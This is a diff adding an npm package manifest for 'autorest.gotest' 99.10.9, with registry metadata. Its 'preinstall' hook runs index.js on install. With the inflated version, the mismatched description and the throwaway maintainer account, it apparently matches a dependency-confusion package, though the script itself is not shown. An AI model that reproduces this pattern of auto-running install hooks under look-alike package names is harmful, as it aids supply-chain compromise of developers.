@@ -1,0 +1,39 @@
+{
+    "name": "autorest.gotest",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "autorest.gotest@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-90XdjIivUcb33P0UQmD/ipIpPuHPn0xq//mY1r8i+FGdTsYjGHw5EWg3dKfrdrwl9Hkqdh4aYIfWqmqU1VuJmg==",
+        "shasum": "e0bd39ab92f0064308a5c7e6fafcadad0c40b028",
+        "tarball": "https://registry.npmjs.org/autorest.gotest/-/autorest.gotest-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5067,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPI2hACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpwEBAAkcpqOrNSIMuox27EsHNSUXNvuPhiQfrpSiu5QF90Nvv1EJzQ\r\n/9IbTgNdorKOnR0GAgMFWrDL1pOHq4cH23aNTYvWby68jCnXts4Pgm60+L9m\r\nwZR2ZCw1O0TavIIu9Wv4z2fqY9Nk5pldJVlhjDOCA6redIrXr5M07r0Jf7sm\r\ntLiaGqAkEUCdXlbQes+gx3YNY2pOmDiMNn7ZRFpAibJnzd0cj9NVUBT77zLq\r\nW3Dore7W5SKYczRJKyYOAbie8GNyFBkJuLSyHwg+rjnbh8g3crpA6dYqjfK/\r\nz16YWpDh3U5ixEvT4XbNgFkZiSN/yGdrRBQfmsS3k5aQzu6FnT8tMDOUMbqp\r\nYWXbVQBD7wvf0U7Ac125CzZgQjFLd8Bjx/YbiXii6jPpVx4+JuNP3ccpGK2i\r\nTZNU9KsmhvIUSn7i88wYtTa+X3p0AwSFipLsNjBwj0C0EWjmfEkv6yXEe6st\r\nTHSY1DzdLEgysubULUKe5ULsQjvUI/KRpG4PX7skHZaBagsDqBqB+ePjtMUV\r\n5Cl8XYSQlnzWIIJoWgp9C7YnBBJwMs2irGuSQxRylGY2f2Zo7jaAZyNlL5R+\r\nem5NRZMSih44A0qQzlT3wgP03bfd8jcWzrppo6HvSUV+10HTttlfZvi4jiZm\r\nsVTOmO8NRtFRa5VXQkzGONbG6srTIYIFVio=\r\n=0Tvt\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "r3vgvqj7",
+        "email": "r3vgvqj7@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "r3vgvqj7",
+            "email": "r3vgvqj7@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/autorest.gotest_99.10.9_1648135585647_0.65104443742723"
+    },
+    "_hasShrinkwrap": false
+}
